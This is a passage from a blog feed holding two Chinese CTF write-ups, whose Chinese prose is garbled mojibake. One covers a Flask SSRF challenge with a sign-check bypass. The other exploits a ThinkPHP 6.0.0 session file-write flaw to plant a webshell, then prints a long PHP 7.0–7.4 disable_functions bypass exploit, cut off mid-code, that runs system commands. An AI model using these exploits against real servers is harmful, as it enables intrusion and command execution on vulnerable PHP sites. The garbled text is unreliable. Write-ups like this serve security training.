class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">åœ¨/De1taè·¯ç”±ä¸‹,ç”¨getçš„æ–¹å¼ä¼ å…¥å‚æ•°action,sign,param,å¹¶å¯¹paramè¿›è¡Œwafè¿‡æ»¤,banæ‰äº†fileå’Œgopheråè®®</span></span><br><span class="line"><span class="string">é€šè¿‡è¿‡æ»¤ååˆ›å»ºä¸€ä¸ªtaskå¯¹è±¡,ç„¶åè¿”å›å…¶æ‰§è¡ŒExec()å‡½æ•°å¹¶jsonåºåˆ—åŒ–åçš„å†…å®¹ï¼Œå³åºåˆ—åŒ–åçš„resultæ•°ç»„</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> (waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ¤æ–­æŒ‡å®šçš„paramæ˜¯å¦å­˜åœ¨,æ˜¯åˆ™è¿”å›param,å¦åˆ™è¿”å›æŠ¥é”™</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æŠŠsecret_key,param,actionæ‹¼æ¥èµ·æ¥è¿›è¡Œmd5åŠ å¯†</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#å°†ä¼ å…¥çš„contentè¿›è¡Œmd5åŠ å¯†</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä»¥gopheræˆ–fileå¼€å¤´(å¿½ç•¥å¤§å°å†™)çš„paramè¿”å›trueï¼Œåä¹‹è¿”å›false</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¢˜ç›®è¿˜æœ‰é¢å¤–hint:<code>flag is in ./flag.txt</code>ï¼Œç»“åˆé¢˜ç›®åç§°ï¼Œæ€è·¯åº”è¯¥å°±æ˜¯ç”¨SSRFçš„æ–¹å¼å¾—åˆ°flag.txtæ–‡ä»¶çš„å†…å®¹</p><p>Task()ç±»ä¸­çš„Exec()å‡½æ•°å¯¹æ–‡ä»¶çš„è®¿é—®åšå‡ºäº†è§„å®šï¼Œå› ä¸ºflag.txtæ˜¯å·²ç»å­˜åœ¨çš„æ–‡ä»¶ï¼Œæ•…action=scanæ—¶æ˜¯æ— æ³•ç›´æ¥å°†flagæå–å‡ºæ¥ï¼Œä½†è¯¥å‡½æ•°åœ¨è¿›è¡Œå¯¹actionçš„åˆ¤æ–­æ—¶ï¼Œå¹¶æ²¡æœ‰ä¸¥æ ¼åŒºåˆ†scanä¸readï¼Œè€Œæ˜¯ä½¿ç”¨<code>in</code>çš„æ–¹å¼è¿›è¡Œåˆ¤æ–­ï¼Œè¿™æ ·åªè¦actionåŒæ—¶æœ‰readå’Œscanå°±å¯ä»¥åŒæ—¶è¿›è¡Œæ–‡ä»¶å†™å…¥å’Œè¯»å–å¹¶èµ‹å€¼ç»™resultæ•°ç»„</p><p>/geneSignè·¯ç”±çš„ä½œç”¨æ˜¯ç”Ÿæˆç›¸åº”çš„signï¼Œè¿™é‡Œactionå·²ç»è¢«å›ºå®šå†™ä¸ºscanï¼Œæ•…éœ€ä¼ <code>flag.txtread</code>ï¼Œå¾—åˆ°sign</p><p><img src="/2022/01/10/De1CTF2019-SSRFMe/image-20220110230420074.png" alt="image-20220110230420074"></p><p>åœ¨/De1taè·¯ç”±ä¸‹æŠ“åŒ…ï¼Œå¹¶å°†ä¹‹å‰å¾—åˆ°çš„signä¸paramï¼Œactionä»¥getæ–¹å¼ä¼ é€’ï¼Œé¡µé¢å°±ä¼šè¿”å›flag</p><p><img src="/2022/01/10/De1CTF2019-SSRFMe/image-20220110230708047.png" alt="image-20220110230708047"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; é¢˜ç›®ç›´æ¥ç»™å‡ºæºç ï¼Œæ˜¯flaskæ¡†æ¶ï¼Œè¿›è¡Œå®¡è®¡ï¼Œä»£ç æ³¨é‡Šå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GYCTF2020-EasyThinking-writeup</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/</id>
    <published>2022-01-06T09:36:30.000Z</published>
    <updated>2022-01-07T06:00:20.755Z</updated>
    
    <content type="html"><![CDATA[<p> thinkphp-v6.0.0æ¡†æ¶æ¼æ´+disable_functionsç»•è¿‡</p><p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªç®€æ˜“ç½‘ç«™ï¼Œç›®å½•æ‰«æå‘ç°åœ¨ <code>www.zip</code> æœ‰æºç æ³„éœ²ï¼Œä¸‹è½½ä¸‹æ¥</p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/.%5CGYCTF2020-EasyThinking%5Cimage-20220106175537402.png" alt="image-20220106175537402"></p><p>å¯ä»¥çœ‹å‡ºæ˜¯thinkPHPæ¡†æ¶æ­å»ºçš„ï¼Œæ‰“ä¸ªé”™è¯¯è·¯å¾„å°±èƒ½çœ‹åˆ°å…·ä½“ç‰ˆæœ¬ä¸º6.0.0</p><p>è°·æ­Œ6.0ä»¥ä¸Šçš„thinkPHPæ¼æ´ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ª<a href="https://paper.seebug.org/1114/">thinkPHP6 session ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´</a></p><blockquote><p>2020å¹´1æœˆ13å·ï¼Œ<a href="https://www.uedbox.com/post/tag/thinkphp/">Thinkphp</a> 6.0.2å‘å¸ƒï¼Œåœ¨è¯¦æƒ…é¡µæŒ‡å‡ºä¿®å¤äº†ä¸€å¤„<code>Sessionå®‰å…¨éšæ‚£</code>ã€‚ç»åˆ†æï¼Œè¯¥æ¼æ´å…è®¸æ”»å‡»è€…åœ¨ç›®æ ‡ç¯å¢ƒå¯ç”¨sessionçš„æ¡ä»¶ä¸‹åˆ›å»ºä»»æ„æ–‡ä»¶ä»¥åŠåˆ é™¤ä»»æ„æ–‡ä»¶ï¼Œåœ¨ç‰¹å®šæƒ…å†µä¸‹è¿˜å¯ä»¥<a href="https://www.uedbox.com/post/tag/getshell/">getshell</a>ã€‚</p><p>å…·ä½“å—å½±å“ç‰ˆæœ¬ä¸ºThinkPHP6.0.0-6.0.1ã€‚</p></blockquote><p>åœ¨æºç app\home\controllerè·¯å¾„ä¸‹æœ‰Member.phpæ–‡ä»¶ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªå…³é”®å‡½æ•°search()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (Request::isPost())&#123;</span><br><span class="line">            <span class="keyword">if</span> (!session(<span class="string">&#x27;?UID&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> redirect(<span class="string">&#x27;/home/member/login&#x27;</span>);            </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$data</span> = input(<span class="string">&quot;post.&quot;</span>);</span><br><span class="line">            <span class="variable">$record</span> = session(<span class="string">&quot;Record&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!session(<span class="string">&quot;Record&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                session(<span class="string">&quot;Record&quot;</span>,<span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$recordArr</span> = explode(<span class="string">&quot;,&quot;</span>,<span class="variable">$record</span>);</span><br><span class="line">                <span class="variable">$recordLen</span> = sizeof(<span class="variable">$recordArr</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$recordLen</span> &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">                    array_shift(<span class="variable">$recordArr</span>);</span><br><span class="line">                    session(<span class="string">&quot;Record&quot;</span>,implode(<span class="string">&quot;,&quot;</span>,<span class="variable">$recordArr</span>) . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">                    <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            session(<span class="string">&quot;Record&quot;</span>,<span class="variable">$record</span> . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">            <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> View(<span class="string">&quot;search&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¼šå°†keyä½œä¸ºsessionä¸­Recordçš„å€¼ï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨keyè¿™ä¸ªå¯æ§çš„å€¼æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106212749705.png" alt="image-20220106212749705"></p><p>ä¸Šä¼ åç”¨èšå‰‘è¿æ¥</p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106213051067.png"></p><p>ä½†æ˜¯é¢˜ç›®åˆ°è¿™è¿˜æ²¡æœ‰ç»“æŸï¼Œåœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°/flagï¼Œè¿›å»åå´æ²¡æœ‰flagçš„ä¿¡æ¯</p><p>/flagæ—è¾¹æœ‰ä¸€ä¸ª/readflagï¼Œå¤§æ¦‚ç‡å°±æ˜¯è¦é€šè¿‡å®ƒæ¥è·å–flag</p><p>æŠŠkeyçš„å†…å®¹æ¢ä¸ºphpinfo()ï¼Œè®¿é—®shellæ–‡ä»¶æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106232020235.png" alt="image-20220106232020235"></p><p>å¯ä»¥çœ‹åˆ°å¾ˆå¤šå‡½æ•°éƒ½è¢«è¿‡æ»¤æ‰ï¼Œå¯ä»¥åœ¨<a href="https://github.com/mm0r1/exploits/tree/master">å¤§ä½¬çš„github</a>æ‰¾åˆ°php7.0~7.4çš„é€šæ€è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;/readflag&quot;</span>); <span class="comment">//è¿™é‡Œæ˜¯æƒ³è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= chr(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = chr(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span 